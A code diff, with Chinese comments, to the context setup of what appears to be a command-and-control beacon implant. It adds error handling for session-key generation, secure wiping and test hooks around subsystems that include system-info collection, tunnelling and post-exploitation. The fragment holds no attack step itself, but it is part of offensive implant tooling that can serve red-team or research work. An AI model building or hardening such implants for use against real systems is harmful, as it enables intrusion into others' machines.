@@ -1,21 +1,45 @@
 #include "beacon_context.h"
 
+#ifdef BEACON_TEST
+#include "beacon_test_hooks.h"
+#endif
+
 /*
  * ContextInit - 零初始化信标上下文并启动所有子系统。
- *   生成随机信标 ID 和会话密钥，然后初始化
- *   发件箱、传输管理器和隧道管理器。
+ *   先通过临时变量生成随机信标 ID 和会话密钥，全部成功后才写入上下文。
+ *   随机数失败时清理敏感数据并返回 FALSE。
  */
-VOID ContextInit(BeaconContext* ctx)
+BOOL ContextInit(BeaconContext* ctx)
 {
+    UINT32 beacon_id = 0;
+    BYTE8 session_key[BEACON_SESSION_KEY_SIZE];
+
+    if (!ctx) return FALSE;
+
+#ifdef BEACON_TEST
+    BeaconTestRecord(BEACON_TEST_EVENT_CONTEXT_INIT_BEGIN, 0, 0);
+#endif
+
     ZeroMemory(ctx, sizeof(*ctx));
 
     /* 加载默认配置并收集系统元数据 */
     ProfileLoad(&ctx->profile);
     SysinfoCollect(&ctx->meta);
 
-    /* 生成唯一的信标标识符和随机会话密钥 */
-    ctx->beacon_id = CryptoRandomU32();
-    CryptoRandom(ctx->session_key, sizeof(ctx->session_key));
+    /* 生成唯一的信标标识符和随机会话密钥，失败则清理并返回 FALSE */
+    if (!CryptoRandomU32(&beacon_id) ||
+        !CryptoRandom(session_key, sizeof(session_key))) {
+        SecureZeroMemory(session_key, sizeof(session_key));
+        SecureZeroMemory(ctx, sizeof(*ctx));
+#ifdef BEACON_TEST
+        BeaconTestRecord(BEACON_TEST_EVENT_CONTEXT_INIT_FAILED, 0, 0);
+#endif
+        return FALSE;
+    }
+
+    ctx->beacon_id = beacon_id;
+    memcpy(ctx->session_key, session_key, sizeof(ctx->session_key));
+    SecureZeroMemory(session_key, sizeof(session_key));
 
     ctx->active = 1;
 
@@ -27,6 +51,8 @@ VOID ContextInit(BeaconContext* ctx)
     TunnelInit(&ctx->tunnels, ctx);
     CascadeInit(&ctx->cascade, ctx);
     PostExInit(&ctx->postex, ctx);
+
+    return TRUE;
 }
 
 /*
@@ -34,6 +60,10 @@ VOID ContextInit(BeaconContext* ctx)
  */
 VOID ContextFree(BeaconContext* ctx)
 {
+#ifdef BEACON_TEST
+    BeaconTestRecord(BEACON_TEST_EVENT_CONTEXT_FREE, 0, 0);
+#endif
+
     PostExFree(&ctx->postex);
     JobFree(&ctx->jobs);
     CascadeFree(&ctx->cascade);
